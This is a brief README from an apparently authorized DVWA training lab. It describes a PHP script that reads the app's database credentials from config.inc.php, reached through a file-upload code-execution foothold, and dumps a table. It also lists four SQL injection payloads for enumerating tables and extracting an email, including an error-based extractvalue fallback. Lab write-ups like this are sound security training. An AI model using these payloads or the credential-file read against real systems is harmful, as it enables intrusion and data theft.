# payloads/

Authorized DVWA lab only.

- **sql.php** — reads DVWA's DB credentials from `config.inc.php`, connects, finds the `vi*`
  table, and dumps its columns and rows. Used to recover the email when the SQLi output
  channel dropped UNION-with-data responses (a pivot through the File Upload RCE foothold).

In-channel payloads used (paste into the "User ID" box):

```sql
1'                                                              -- confirm injection
' UNION SELECT table_name, table_name FROM information_schema.tables #   -- enumerate tables
' union select null, email from dvwa.vips #                     -- extract email (intended)
' OR extractvalue(1,concat(0x7e,(SELECT email FROM dvwa.vips LIMIT 1)))-- -   -- error-based fallback
```
